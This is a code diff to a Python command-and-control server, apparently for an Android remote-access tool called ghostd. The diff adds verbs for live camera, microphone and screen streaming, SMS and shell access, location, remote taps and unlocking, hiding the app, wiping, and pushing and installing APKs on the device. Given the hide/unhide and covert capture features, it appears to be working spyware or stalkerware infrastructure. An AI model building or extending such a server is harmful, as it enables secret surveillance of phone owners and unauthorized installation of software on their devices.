@@ -9,18 +9,29 @@ Device protocol (JSON messages over WebSocket):
                    {"type":"ping"}
                    {"type":"info","battery":..,"ip":..}
                    {"type":"result","cmd_id":..,"ok":true,"result":..}
+                   {"type":"stream_start","stream":..,"encoding":"mjpeg","meta":..}
+                   {"type":"stream_end","stream":..,"frames":N,"reason":..}
+                   binary: "<json header>\\n<payload>" (MediaBus framing —
+                   {"type":"frame","stream":..,"seq":..,"len":N} for live
+                   media; file_chunk/file_end for device->server file streams)
   server -> client: {"type":"welcome"}
                    {"type":"cmd","cmd_id":..,"action":..,"args":[..]}
+                   binary: file_chunk frames + text file_end (files put —
+                   the FileReceiver protocol, 64 KB chunks + sha256)
 
 State: server/state.json   (device registry)
        server/history.json (command history)
+       server/apks/        (APK store for `update` pushes, gitignored)
 """
 import argparse
 import asyncio
+import base64
+import hashlib
 import json
 import sys
 import time
 import uuid
+from collections import deque
 from pathlib import Path
 
 try:
@@ -32,8 +43,140 @@ except ImportError:
 BASE = Path(__file__).resolve().parent
 STATE_FILE = BASE / "state.json"
 HISTORY_FILE = BASE / "history.json"
+APK_DIR = BASE / "apks"
 
-ACTIONS = {"files", "sms", "shell", "screen", "loc", "update", "destroy"}
+# Every verb the client CommandHandler (client-main) or the PROJECT.md v1
+# command spec defines. Unknown actions are rejected with a clean error.
+ACTIONS = {
+    # media capture
+    "screen", "cam", "mic",
+    # system control
+    "brightness", "volume", "wake",
+    # UI / sidekick-forwarded verbs
+    "ui", "tap", "longclick", "type", "key", "swipe", "unlock",
+    "arm", "disarm", "sidekick",
+    # data
+    "files", "sms", "shell", "loc", "device",
+    # lifecycle
+    "update", "destroy", "hide", "unhide", "status", "ping",
+}
+
+# Where `update` pushes land on the device (client SidekickInstaller default
+# for the sidekick; ghostd self-update reads its own slot).
+APK_DEST = {"sidekick": "/sdcard/Download/ghosta.apk",
+            "self": "/sdcard/Download/ghostd.apk"}
+
+# Server->device file push chunk size (client FileReceiver protocol).
+PUSH_CHUNK = 64 * 1024
+
+
+def is_jpeg(data):
+    return bytes(data[:2]) == b"\xff\xd8"
+
+
+def parse_frame(data):
+    """MediaBus framing: UTF-8 JSON header + b'\\n' + payload."""
+    if isinstance(data, str):
+        return None
+    nl = data.find(b"\n")
+    if nl <= 0:
+        return None
+    try:
+        header = json.loads(data[:nl].decode("utf-8"))
+    except (UnicodeDecodeError, json.JSONDecodeError):
+        return None
+    if not isinstance(header, dict):
+        return None
+    return header, data[nl + 1:]
+
+
+class StreamCache:
+    """Bounded latest-frame cache for live media streams.
+
+    Keyed by (device_id, stream). At most MAX_STREAMS keys are kept —
+    the least-recently-updated stream is evicted — and each stream keeps
+    only its FRAMES_PER_STREAM most recent frames. Video frames are JPEG
+    payloads (screen/cam live); audio (mic live) is PCM and is stored but
+    not served as image/jpeg.
+    """
+
+    MAX_STREAMS = 3
+    FRAMES_PER_STREAM = 2
+
+    def __init__(self):
+        self.streams = {}  # (device_id, stream) -> {encoding, frames deque}
+
+    def _last_ts(self, key):
+        frames = self.streams[key]["frames"]
+        return frames[-1][0] if frames else 0.0
+
+    def set_encoding(self, device_id, stream, encoding):
+        if not stream or not encoding:
+            return
+        key = (device_id, stream)
+        e = self.streams.get(key)
+        if e is None:
+            if len(self.streams) >= self.MAX_STREAMS:
+                oldest = min(self.streams, key=self._last_ts)
+                del self.streams[oldest]
+            e = self.streams[key] = {"encoding": None,
+                                     "frames": deque(maxlen=self.FRAMES_PER_STREAM)}
+        e["encoding"] = encoding
+
+    def put(self, device_id, stream, payload, encoding=None):
+        if not stream:
+            return
+        key = (device_id, stream)
+        e = self.streams.get(key)
+        if e is None:
+            if len(self.streams) >= self.MAX_STREAMS:
+                oldest = min(self.streams, key=self._last_ts)
+                del self.streams[oldest]
+            e = self.streams[key] = {
+                "encoding": encoding,
+                "frames": deque(maxlen=self.FRAMES_PER_STREAM),
+            }
+        if encoding:
+            e["encoding"] = encoding
+        e["frames"].append((time.time(), bytes(payload)))
+
+    def latest(self, device_id, stream=None, jpeg_only=True):
+        """Newest frame for a device (or a named stream). Returns
+        (stream_name, encoding, ts, payload) or None."""
+        keys = [k for k in self.streams if k[0] == device_id]
+        if not keys:
+            return None
+        if stream is not None:
+            key = (device_id, stream)
+            if key not in self.streams:
+                return None
+        else:
+            key = max(keys, key=self._last_ts)
+        e = self.streams[key]
+        if not e["frames"]:
+            return None
+        ts, payload = e["frames"][-1]
+        if jpeg_only and not is_jpeg(payload):
+            return None
+        return key[1], e.get("encoding"), ts, payload
+
+    def drop(self, device_id, stream):
+        self.streams.pop((device_id, stream), None)
+
+    def drop_device(self, device_id):
+        for k in [k for k in self.streams if k[0] == device_id]:
+            del self.streams[k]
+
+    def listing(self):
+        out = []
+        for (did, stream), e in sorted(self.streams.items()):
+            out.append({
+                "device_id": did, "stream": stream,
+                "encoding": e.get("encoding"),
+                "last_frame": self._last_ts((did, stream)),
+                "frames_cached": len(e["frames"]),
+            })
+        return out
 
 
 def load_json(path, default):
@@ -55,6 +198,7 @@ class Daemon:
         self.history = load_json(HISTORY_FILE, [])
         self.conns = {}    # device_id -> websocket
         self.pending = {}  # cmd_id -> {"event","result","ok"}
+        self.streams = StreamCache()
 
     # ---------- persistence ----------
     def persist_state(self):
@@ -115,11 +259,93 @@ class Daemon:
             out[d] = str(e) if isinstance(e, Exception) else e
         return out
 
+    # ---------- server -> device file push (FileReceiver protocol) ----------
+    async def push_file(self, device_id, src, dest, wait=180.0):
+        """Stream a local file to the device: cmd `files put <dest>` followed
+        by framed 64 KB file_chunk binaries + text file_end with sha256
+        (matches client-main FileReceiver). Blocks until the device ACKs."""
+        ws = self.conns.get(device_id)
+        if ws is None:
+            raise ConnectionError(f"device {device_id} is offline")
+        src, dest = Path(src), str(dest)
+        data = src.read_bytes()
+        sha256 = hashlib.sha256(data).hexdigest()
+        total, chunks = len(data), (len(data) + PUSH_CHUNK - 1) // PUSH_CHUNK
+        cmd_id = uuid.uuid4().hex[:12]
+        rec = {"event": asyncio.Event(), "result": None, "ok": False}
+        self.pending[cmd_id] = rec
+        entry = {"cmd_id": cmd_id, "ts": time.time(), "device_id": device_id,
+                 "action": "files put", "args": [dest], "status": "pending"}
+        self.history.append(entry)
+        self.persist_history()
+        await ws.send(json.dumps({"type": "cmd", "cmd_id": cmd_id,
+                                  "action": "files", "args": ["put", dest]}))
+        # the client now blocks inside FileReceiver.receive(dest) until the
+        # frames below complete the transfer
+        for seq, off in enumerate(range(0, len(data), PUSH_CHUNK)):
+            payload = data[off:off + PUSH_CHUNK]
+            header = {"type": "file_chunk", "seq": seq, "path": dest,
+                      "len": len(payload), "total": total}
+            await ws.send(json.dumps(header).encode() + b"\n" + payload)
+        await ws.send(json.dumps({"type": "file_end", "path": dest,
+                                  "dest": dest, "bytes": total,
+                                  "chunks": chunks, "sha256": sha256}))
+        try:
+            await asyncio.wait_for(rec["event"].wait(), timeout=wait)
+            entry["status"] = "ok" if rec["ok"] else "error"
+            entry["result"] = rec["result"]
+        except asyncio.TimeoutError:
+            entry["status"] = "timeout"
+        self.persist_history()
+        return entry
+
+    # ---------- update flow ----------
+    async def update_push(self, device_id, target, apk=None):
+        """`update self|sidekick [--apk path]`: push the APK to the device
+        (files-put flow) then trigger the install verb (sidekick install /
+        update self)."""
+        if target not in APK_DEST:
+            raise ValueError("update: expected 'self' or 'sidekick'")
+        if apk:
+            src = Path(apk).expanduser()
+        else:
+            src = APK_DIR / ("ghosta.apk" if target == "sidekick" else "ghostd.apk")
+        if not src.is_file():
+            raise FileNotFoundError(
+                f"apk not found: {src} (place one first: "
+                f"ghostctl.py apks add {target} <path>)")
+        dest = APK_DEST[target]
+        push = await self.push_file(device_id, src, dest)
+        if push["status"] != "ok":
+            return push
+        if target == "sidekick":
+            return await self.dispatch(device_id, "sidekick",
+                                      ["install", dest], wait=120.0)
+        return await self.dispatch(device_id, "update", ["self"], wait=120.0)
+
+    # ---------- stream relay ----------
+    def on_device_binary(self, device_id, raw):
+        """Framed binary messages from a device (MediaBus framing)."""
+        parsed = parse_frame(raw)
+        if parsed is None:
+            return
+        header, payload = parsed
+        mtype = header.get("type")
+        if mtype == "frame":
+            # live media frame — cache the latest JPEG/PCM payload
+            self.streams.put(device_id, header.get("stream"), payload)
+        # device->server file streams (file_chunk/file_end from `files get`)
+        # are handled by the operator via the result JSON; not stored here.
+
     # ---------- websocket device handler ----------
     async def device_handler(self, ws):
         device_id = None
         try:
             async for raw in ws:
+                if isinstance(raw, (bytes, bytearray)):
+                    if device_id is not None:
+                        self.on_device_binary(device_id, raw)
+                    continue
                 try:
                     msg = json.loads(raw)
                 except json.JSONDecodeError:
@@ -144,6 +370,11 @@ class Daemon:
                     self.touch(device_id, online=None,
                                extra={"battery": msg.get("battery"),
                                       "ip": msg.get("ip")})
+                elif mtype == "stream_start":
+                    self.streams.set_encoding(device_id, msg.get("stream"),
+                                              msg.get("encoding"))
+                elif mtype == "stream_end":
+                    self.streams.drop(device_id, msg.get("stream"))
                 elif mtype == "result":
                     rec = self.pending.pop(msg.get("cmd_id"), None)
                     if rec:
@@ -154,6 +385,7 @@ class Daemon:
             if device_id and self.conns.get(device_id) is ws:
                 del self.conns[device_id]
                 self.touch(device_id, online=False)
+                self.streams.drop_device(device_id)
 
     # ---------- admin (CLI) handler: newline-delimited JSON ----------
     async def admin_handler(self, reader, writer):
@@ -180,6 +412,21 @@ class Daemon:
         try:
             if op in ("list", "status", "devices"):
                 return {"ok": True, "devices": self.device_list()}
+            if op == "streams":
+                return {"ok": True, "streams": self.streams.listing()}
+            if op == "stream_frame":
+                fr = self.streams.latest(req["device_id"], req.get("stream"))
+                if fr is None:
+                    return {"ok": False,
+                            "error": f"no cached jpeg frame for {req['device_id']}"
+                                    f"{'' if not req.get('stream') else ' ' + req['stream']}"}
+                stream, encoding, ts, payload = fr
+                return {"ok": True, "stream": stream, "encoding": encoding,
+                        "ts": ts, "frame_b64": base64.b64encode(payload).decode()}
+            if op == "update":
+                entry = await self.update_push(req["device_id"], req.get("target"),
+                                               req.get("apk"))
+                return {"ok": entry.get("status") == "ok", "entry": entry}
             if op == "command":
                 action, args = req["action"], req.get("args", [])
                 wait = float(req.get("wait", 10))
